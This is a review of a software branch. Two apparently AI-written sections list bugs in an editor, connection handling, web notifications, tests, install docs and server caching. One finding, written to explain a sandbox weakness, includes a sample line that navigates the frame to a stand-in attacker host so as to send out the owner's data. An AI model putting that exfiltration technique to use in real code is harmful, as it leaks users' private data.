---
reviewed: branch
commits: 183dac038935f8646f59eb166f20549a21abea5a..18aacf1c92b78519b18d5f3ad598faa24018d248
---

# Findings: nsh-migration, the branch

## Claude Code · Opus 5.5

I reviewed the range at high effort: the security paths, the frame format, the draft primitives, the
removal, and the docs. I found 8 candidates; nothing was verified by a second pass, so treat each as
plausible until checked.

8 findings, most severe first:

1. `app/screens/editor/edited.ts:63`: `saveOver` sets the shared `over` flag and leans on
   `unsavedText.save`'s de-duplication, so the flag can be used up by the wrong save or left set,
   and a later ordinary save then skips the 'changed on disk' check.

   Failure scenario: The human presses Save, and the save of snapshot S is already in `of.send` (its
   check passed). The file changes on disk, and the human presses 'save over' on the same text.
   `field.save` returns the queued promise for S, so no new run resets `over`, and it stays true.
   Later an agent writes the file again and the human types and presses Save: the check
   `!over && changed()` is skipped, and `of.send(value, disk().hash)` names the current hash. The
   server accepts it and the agent's change is overwritten without a word. In a second case, a 'save
   over' clicked while an earlier, different snapshot is queued gives `over` to that earlier save
   instead.

2. `app/store/connection.ts:360`: When a binary frame can't be read (the `unreadable` path), the
   client drops the subscription locally but never sends `unsub`, so the server keeps streaming that
   record, and the record stays in error until the next reconnect.

   Failure scenario: The server sends a `data` frame whose part is over CEILING or doesn't inflate.
   `failed()` deletes `subs[id]` and sets `entry.error`, but sends no `unsub` and doesn't subscribe
   again. The server still holds the subscription: every later change, and a large compressed value
   each time it falls behind, is packed, sent, and ignored (`subs.get` is undefined). Meanwhile the
   screen shows an error for a record that a fresh `sub` would read fine, until the connection
   drops.

3. `crates/server/src/http/web/policy.rs:36`: The extension frame's policy says a page 'reaches no
   other site', but nothing stops the frame from navigating itself, and NSH's web view sandbox
   grants `allow-popups` and `allow-popups-to-escape-sandbox`, so a page can send what it was given
   to any site.

   Failure scenario: An extension page granted `record`/`call` reads the owner's data through the
   channel, then runs `location.href = 'https://evil.example/?d=' + encodeURIComponent(data)` or
   `window.open(...)`. `connect-src 'self'` and `img-src 'self'` don't cover navigation, and the
   popup escapes the sandbox. The data leaves the machine, against the rule in `host.web.tsx` and
   the policy's comment. The Linux view isn't affected. Also, after such a navigation the app keeps
   posting events and replies with target origin `*` to whatever page now sits in the frame.

4. `app/web/notify.ts:39`: `new Notification(...)` throws a TypeError in Chrome on Android, and in
   installed web apps that only support `ServiceWorkerRegistration.showNotification`. The phone in a
   browser is task 59's target.

   Failure scenario: On a phone in Chrome over the owner's HTTPS proxy, the human allows
   notifications. When something needs them while the tab is in the background, `toDesktop` calls
   `notifyBrowser`, which throws 'Illegal constructor' inside the Notifier's effect. Unlike the
   desktop path, which `.catch`es, nothing catches it: no notification is shown, the throw reaches
   the shell's ErrorBoundary, and it happens again on each new row.

5. `crates/app/tests/extensions.rs:339`: `a_page_fetched_after_its_place_closed_never_runs` still
   fails under load after R432's wait was added (R451: 3 engines for 2). R432 said that outcome
   would mean a real race in R261's handling of a view out of its window. R451 dismissed it as load
   instead.

   Failure scenario: The place closes, so the view leaves the window (one widget fewer), and the
   late fetch should then wait. It still sometimes runs, in an engine nothing stops (R261:
   `Surface`'s drop does not stop it). Each time a pane closes while its page is loading, the app
   can leak a running extension engine, and the test that guards this is being re-run instead of
   fixed.

6. `INSTALL.md:135`: The one-time move can't be followed in order: step 3 offers the desktop app as
   the first start, but step 4 says that start prints the access key, and step 5 says to copy
   `repositories.json` 'before the first start', which step 3 already did.

   Failure scenario: A user opens the desktop app at step 3. Its server prints no key (output not at
   a terminal), so step 4 leaves them with no key for a browser, and nothing points to `ura key`. At
   step 5 they run the `cp`, which replaces the list the running server already wrote, dropping the
   repository step 3 added.

7. `crates/server/src/live/topic.rs:361`: Each `Whole` clones the record's full value next to
   `state.value`, and its `Part` stores the JSON or compressed bytes too. A large record is kept in
   memory about three times, per topic, until it changes.

   Failure scenario: A `Ledger` of 532 KB, or the 20,000-message chat, sits as `state.value`, plus
   `Whole.value` (a deep clone), plus `Part::Text` (its JSON again) whenever a subscriber needed it
   whole. Every change clones again on the next whole send. A `Whole` that holds only `seq` and the
   `Part`, built from a borrowed `&Value`, would avoid the clone.

8. `crates/server/src/http/web.rs:257`: Unhashed build files (`extension.html`, the manifest) are
   sent `no-cache` with no ETag, so every revalidation downloads the whole file again. Only the page
   gets a tag and a 304.

   Failure scenario: On loopback, each extension load opens a new frame at
   `<name>.localhost/extension.html?load=N`. The browser revalidates, gets no validator, and fetches
   the full page again for every load of every extension, over a phone's link too. The page's ETag
   logic in the same function could cover every unhashed file.

## Codex · GPT-6.1-Sol

The changes retain a silent draft-loss case and leave browser confirmations, mobile notifications,
and the long-transcript jump path broken. Targeted app-test execution was blocked by the sandbox's
read-only Nix cache.

Full review comments:

- [P1] Give confirmations an explicit browser layer scope —
  /home/tolki/Development/ai/uraeda/.worktrees/2026-11-10-nsh-migration/app/ui/controls/Confirm.tsx:94-100
  In a browser, these `Key` components and the confirmation button inherit the caller's scope, not
  the scope created inside `Dialog`/`Float`. For example, Jobs already declares `r`, so opening its
  Run now confirmation registers another `r` in the same scope and throws; other confirmation
  shortcuts remain outside the active modal layer. Pass an explicit layer scope through the dialog
  and its controls, as Menu and Select do. This follows the browser-specific requirement in
  [AGENTS.md](/AGENTS.md).

- [P1] Preserve edits that return to the pre-save text —
  /home/tolki/Development/ai/uraeda/.worktrees/2026-11-10-nsh-migration/app/ui/text/unsaved.ts:277-283
  Start with saved text `original`, change it to `snapshot`, save, and change it back to `original`
  while the request is pending. `keep()` removes the draft because it matches the old saved text.
  When the save succeeds, this fallback chooses `snapshot` and overwrites the newer value in
  `typed`, silently losing the reversal and marking the field clean. Capture the currently displayed
  text independently of whether a persisted draft exists, then retain it as an edit over the
  successful snapshot.

- [P2] Use persistent notifications on mobile browsers —
  /home/tolki/Development/ai/uraeda/.worktrees/2026-11-10-nsh-migration/app/web/notify.ts:36-39 On
  mobile browsers such as Chrome for Android, notification permission can be granted while
  `new Notification(...)` still throws a TypeError: notifications must be shown through a service
  worker's `showNotification()`. Consequently, enabling notifications on the phone succeeds in
  Settings, but the first background notification fails synchronously inside the notifier. Implement
  the service-worker path, or detect this unsupported configuration and avoid offering a switch that
  cannot work.

- [P2] Apply the far-end jump rule to the button path too —
  /home/tolki/Development/ai/uraeda/.worktrees/2026-11-10-nsh-migration/app/ui/lists/VirtualList.tsx:134-136
  The NSH 0.5.0 workaround is applied only to cursor navigation here. The transcript's “Jump to the
  latest” button calls `VirtualListRef.toEnd()`, which still unconditionally uses
  `scrollToEnd({ animated: true })`. From far back in a long transcript, that takes the same
  animated path documented as stopping short after the upgrade, while setting `following` to true.
  Route both entry points through the distance-aware implementation so the button actually reaches
  the latest message.

- [P2] Wait for the extension view itself to leave the window —
  /home/tolki/Development/ai/uraeda/.worktrees/2026-11-10-nsh-migration/crates/app/tests/extensions.rs:352-355
  A decrease in the entire window's widget count does not establish that the extension view has
  closed: loading UI or another subtree can disappear first. Releasing the fetch at that point still
  permits the old, rooted extension view to run its page, producing the repeatedly observed
  extra-engine failure under load. Wait for that specific view to become unrooted, or assert page
  execution through an observable fixture event, rather than using an unrelated aggregate widget
  count as the close barrier.
